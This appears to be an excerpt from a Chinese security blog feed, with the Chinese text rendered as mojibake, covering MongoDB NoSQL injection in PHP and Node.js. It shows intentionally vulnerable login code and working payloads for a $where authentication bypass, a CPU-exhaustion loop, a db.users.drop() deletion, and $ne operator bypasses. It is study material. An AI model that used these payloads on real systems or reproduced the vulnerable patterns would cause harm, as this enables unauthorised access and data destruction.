id="whereæ“ä½œç¬¦">whereæ“ä½œç¬¦</h5><p>åœ¨mongodbä¸­,whereæ“ä½œç¬¦æ˜¯å¯ä»¥æ‰§è¡Œjsè¯­å¥çš„,Mongodb2.4ä¹‹å‰çš„$whereå¯ä»¥ä½¿ç”¨map-reduce,groupæ¥è®¿é—®mongo shellä¸­çš„å…¨å±€å˜é‡å’Œå±æ€§ ç»™å‡ºç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$query_body</span> =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;$where&#x27;</span>=&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string">function q() </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    var username = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    var password = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>].<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    if(username == &#x27;admin&#x27;&amp;&amp;password == &#x27;123456&#x27;) </span></span><br><span class="line"><span class="string">        return true; </span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">        &#123; </span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$query_body</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;test.users&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åœ¨è¿™é‡Œæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloadï¼šusername=1&amp;password=1;return true;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æ•°æ®æµ <img src="/images/2018/06/jsinjection.png" alt="blacsheep" /> phpå…ˆå°†å‚æ•°åŠ åˆ°jsé‡Œé¢,ç„¶åå½¢æˆäº†ä¸€ä¸ªå¥‡å¥‡æ€ªæ€ªçš„js,è¿™ä¸ªjsè¿”åˆ°mongodbé‡Œ,ç„¶ååœ¨æŸ¥è¯¢çš„æ—¶å€™,æœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„js,ä»è€Œç»•è¿‡éªŒè¯ ç„¶åæ–‡ä¸­ä¸€ä¸ªè®©mongodbæœåŠ¡å™¨cpué£™å‡çš„payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1;(function()&#123;var%20date%20=%20new%20Date();%20do&#123;curDate%20=%20new%20Date();&#125;while(curDate-date%3C5000);%20return%20Math.max();&#125;)();</span><br></pre></td></tr></table></figure><h5 id="commandæ–¹æ³•æ³¨å…¥">Commandæ–¹æ³•æ³¨å…¥</h5><p>phpå®˜æ–¹å·²ç»å‹æƒ…æç¤ºä¸è¦ä½¿ç”¨äº†,ä½†è¿˜æ˜¯éš¾å…æœ‰äººä¸ºäº†å®ç°å¥‡æ€ªçš„åŠŸèƒ½å»ä½¿ç”¨,ç»™å‡ºç¤ºä¾‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$manager</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Manager</span>(<span class="string">&quot;mongodb://mongo:27017&quot;</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Command</span>([</span><br><span class="line">// build the <span class="string">&#x27;distinct&#x27;</span> command</span><br><span class="line"><span class="string">&#x27;eval&#x27;</span>=&gt; <span class="string">&quot;db.users.distinct(&#x27;username&#x27;,&#123;&#x27;username&#x27;:&#x27;<span class="subst">$username</span>&#x27;&#125;)&quot;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeCommand</span>(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$cmd</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cursor</span>);</span><br><span class="line"><span class="variable">$doc_failed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;failed.html&quot;</span>);</span><br><span class="line"><span class="variable">$doc_succeed</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">loadHTMLFile</span>(<span class="string">&quot;succeed.html&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_succeed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$doc_failed</span>-&gt;<span class="title function_ invoke__">saveHTML</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cmdé‚£é‡Œå­˜åœ¨æ‹¼æ¥çš„Mongodbçš„shellæ‰§è¡Œ,å¦‚æœåº”ç”¨è¿æ¥çš„æ•°æ®åº“æƒé™å¤Ÿé«˜,æˆ‘ä»¬å¯ä»¥å¹²çš„äº‹æƒ…å°±å¾ˆå¤š,æ¯”å¦‚å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:username=2â€²&#125;);db.users.drop();db.user.find(&#123;â€˜usernameâ€™:â€™2</span><br></pre></td></tr></table></figure><p>åˆ åº“è·‘è·¯äº†è§£ä¸€ä¸‹</p><h3 id="node.jsä¸­çš„nosqlæ³¨å…¥">Node.jsä¸­çš„NoSQLæ³¨å…¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/test&#x27;</span>, &#123; <span class="attr">useMongoClient</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">UserSchema</span> = <span class="keyword">new</span> mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line"><span class="attr">name</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">username</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">password</span>: <span class="title class_">String</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">User</span> = mongoose.<span class="title function_">model</span>(<span class="string">&#x27;users&#x27;</span>, <span class="title class_">UserSchema</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, __dirname);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;jade&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line"><span class="title class_">User</span>.<span class="title function_">findOne</span>(&#123;<span class="attr">username</span>: req.<span class="property">body</span>.<span class="property">username</span>, <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>&#125;, <span class="keyword">function</span> (<span class="params">err, user</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user)</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: err.<span class="property">message</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!user) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Sorry!&#x27;</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;Welcome back &#x27;</span> + user.<span class="property">name</span> + <span class="string">&#x27;!!!&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">49090</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listening on port %d&#x27;</span>, server.<span class="title function_">address</span>().<span class="property">port</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ‰“æ‰°äº†,ä¸ä¼šnodejs,è™½ç„¶åˆ†æä¸»è¦éƒ¨åˆ†è¿˜æ˜¯æ²¡å•¥é—®é¢˜çš„.. payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:49090/</span><br><span class="line">HTTP/1.1Content-Type: application/json&#123;</span><br><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mongodbä¸‹çš„sqlæ³¨å…¥</title>
      <link href="/2018/06/29/mangodb%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/06/29/mangodb%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>å‰å‡ å¤©çœ‹åˆ°å®‰æ’æ¯é‡Œæœ‰ä¸€é“Mongodbçš„æ³¨å…¥é¢˜,æœäº†ä¸€ä¸‹ç›¸å…³çš„ä¸œè¥¿,å‘ç°ä¹Ÿæ˜¯æ¯”è¾ƒè€çš„ä¸œè¥¿äº†,è¿™é‡Œå†™ç¯‡åšå®¢è®°å½•ä¸€ä¸‹å§..</p><h3 id="æ¦‚æ‹¬">æ¦‚æ‹¬</h3><p>phpä¸­æ“ä½œmongoç±»å¯ä»¥ç”¨ä¸‹é¢ä¸¤ç§æ–¹æ³• (1)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//é€‰æ‹©é›†åˆ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">save</span>();    <span class="comment">//å¢</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>();    <span class="comment">//æŸ¥</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">remove</span>();    <span class="comment">//å‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">update</span>();    <span class="comment">//æ”¹</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„,åé¢ä¼šè®²åˆ°,è¿™é‡Œä¸ç»†è¯´ (2)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.save(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//å¢</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.find(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//æŸ¥</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.remove(&#123;&#x27;newsid&#x27;:1&#125;)&quot;</span>;    <span class="comment">//å‡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;db.table.update(&#123;&#x27;newsid&#x27;:1&#125;,&#123;&#x27;newsid&#x27;,2&#125;)&quot;</span>;    æ”¹</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$query</span>);</span><br></pre></td></tr></table></figure><p>ä¼ è¿›çš„æ˜¯å­—ç¬¦ä¸²å˜é‡,ç‰¹åˆ«æ³¨æ„ä¸€ä¸‹,å­—ç¬¦ä¸²çš„ä¹¦å†™è¯­æ³•ä¸ºjsçš„è¯­æ³• ç„¶åmongodbçš„æ“ä½œç¬¦,è¿™ä¸ªæŒºå¤šçš„,ä¸ä¸€ä¸€è®°äº†,ä¸¢å‡ ä¸ªé‡è¦çš„,å…¶ä»–åœ¨è¿™ç¯‡æ–‡ç« é‡Œæ‰¾å§ <a href="https://blog.csdn.net/qq_16313365/article/details/58599253" title="https://blog.csdn.net/qq_16313365/article/details/58599253">https://blog.csdn.net/qq_16313365/article/details/58599253</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$eq</span><br><span class="line">è¯­æ³•ï¼š&#123; &lt;field&gt;: &#123; $eq: &lt;value&gt; &#125; &#125;</span><br><span class="line">é‡Šä¹‰ï¼šåŒ¹é…ç­‰äºï¼ˆ=ï¼‰æŒ‡å®šå€¼çš„æ–‡æ¡£</span><br><span class="line">ä¸¾ä¾‹ï¼š</span><br><span class="line">æŸ¥è¯¢age=20çš„æ–‡æ¡£ï¼š</span><br><span class="line">db.person.find( &#123; age: &#123; $eq: 20 &#125; &#125; )</span><br><span class="line">ç›¸å½“äºï¼š</span><br><span class="line">db.person.find( &#123; age: 20 &#125; )</span><br><span class="line"></span><br><span class="line">$ne</span><br><span class="line">è¯­æ³•ï¼š&#123;field: &#123;$ne: value&#125; &#125;</span><br><span class="line">é‡Šä¹‰ï¼šåŒ¹é…ä¸ç­‰äºï¼ˆâ‰ ï¼‰æŒ‡å®šå€¼çš„æ–‡æ¡£</span><br><span class="line"></span><br><span class="line">$regex</span><br><span class="line">è¯­æ³•ï¼š</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: /pattern/, $options: &#x27;&lt;options&gt;&#x27; &#125; &#125;</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: &#x27;pattern&#x27;, $options: &#x27;&lt;options&gt;&#x27; &#125; &#125;</span><br><span class="line">&#123; &lt;field&gt;: &#123; $regex: /pattern/&lt;options&gt; &#125; &#125;</span><br><span class="line">é‡Šä¹‰ï¼šæ­£åˆ™è¡¨è¾¾å¼æŸ¥è¯¢</span><br><span class="line">ä¸¾ä¾‹ï¼š</span><br><span class="line">db.products.find( &#123; sku: &#123; $regex: /^ABC/i &#125; &#125; )</span><br><span class="line"></span><br><span class="line">$where</span><br><span class="line">é‡Šä¹‰ï¼šæŠŠä¸€ä¸ªå«æœ‰JavaScriptè¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æˆ–è€…æ˜¯æ•´ä¸ªJavaScriptå‡½æ•°è½¬æ¢åˆ°æŸ¥è¯¢ç³»ç»Ÿä¸­ï¼Œå¯¹å†…åµŒæ–‡æ¡£ä¸èµ·ä½œç”¨</span><br><span class="line">ä¸¾ä¾‹ï¼š</span><br><span class="line">db.myCollection.find( &#123; $where: &quot;this.credits == this.debits&quot; &#125; );</span><br><span class="line">db.myCollection.find( &#123; $where: function() &#123; return obj.credits == obj.debits; &#125; &#125; );</span><br></pre></td></tr></table></figure><h3 id="æ”»å‡»">æ”»å‡»</h3><h4 id="æœ€ç®€å•çš„æ°¸çœŸåˆ¤æ–­">1.æœ€ç®€å•çš„æ°¸çœŸåˆ¤æ–­</h4><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//é€‰æ‹©é›†åˆ</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span></span><br><span class="line">        );</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$coll</span>-&gt;<span class="title function_ invoke__">find</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$count</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$count</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;username:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;password:&#x27;</span>.<span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;æœªæ‰¾åˆ°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¼ å…¥çš„usernameå’Œpasswordç›´æ¥æ‹¿å»æŸ¥è¯¢,å‡å¦‚æˆ‘ä»¬ä¼ å…¥æ•°ç»„,mongodbå¯¹äºæˆ‘ä»¬çš„æ•°ç»„ä¼šäº§ç”Ÿè§£æ,ä¸¾ä¸ªä¾‹å­ æˆ‘ä»¬ä¼ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data = array(</span><br><span class="line">&#x27;username&#x27;=&gt;array(&#x27;xx&#x27;=&gt;&#x27;test&#x27;),</span><br><span class="line">&#x27;password&#x27;=&gt;&#x27;test&#x27;);</span><br></pre></td></tr></table></figure><p>ç„¶åmongodbè§£æä¹‹å,æœ€ç»ˆæ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.test.find(&#123;username:&#123;&#x27;xx&#x27;:&#x27;test&#x27;&#125;,password:&#x27;test&#x27;&#125;);</span><br></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸ªç‰¹æ€§,æˆ‘ä»¬åªç”¨æ³¨å…¥ä¸€ä¸ªneå³å¯å®Œæˆæ”»å‡»,payloadå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/2.php?username[$ne]=test&amp;password[$ne]=test</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½è¿›ä¸€æ­¥åˆ©ç”¨,æŸ¥å‡ºå…¶ä»–çš„æ•°æ®å‘¢?æ˜¯å¯ä»¥çš„,åˆ©ç”¨regexæ¥æŸ¥è¯¢å³å¯,è¿™å°±ç›¸å½“äºmysqlé‡Œé¢çš„boolæ³¨</p><h4 id="ç›²æ³¨">2.ç›²æ³¨</h4><p>è¿™é‡Œæ–‡ä¸­ç»™äº†ä¸€ç¯‡14å¹´HCTFçš„wp,çœ‹æ¥è¿™ä¸ªä¸œè¥¿å¾ˆä¹…ä¹‹å‰å°±å·²ç»æœ‰äººç ”ç©¶è¿‡,è¿™é‡Œä¹Ÿæ˜¯å­¦ä¹ ä¸€ä¸‹å§... ä»£ç çŒœæµ‹å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mongo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mongoclient</span>();</span><br><span class="line"><span class="variable">$db</span> = <span class="variable">$mongo</span>-&gt;myinfo; <span class="comment">//é€‰æ‹©æ•°æ®åº“</span></span><br><span class="line"><span class="variable">$coll</span> = <span class="variable">$db</span>-&gt;test; <span class="comment">//é€‰æ‹©é›†åˆ</span></span><br><span class="line"><span class="variable">$lock</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;lock&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$lock</span>)) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;lock&#x27;</span>=&gt;<span 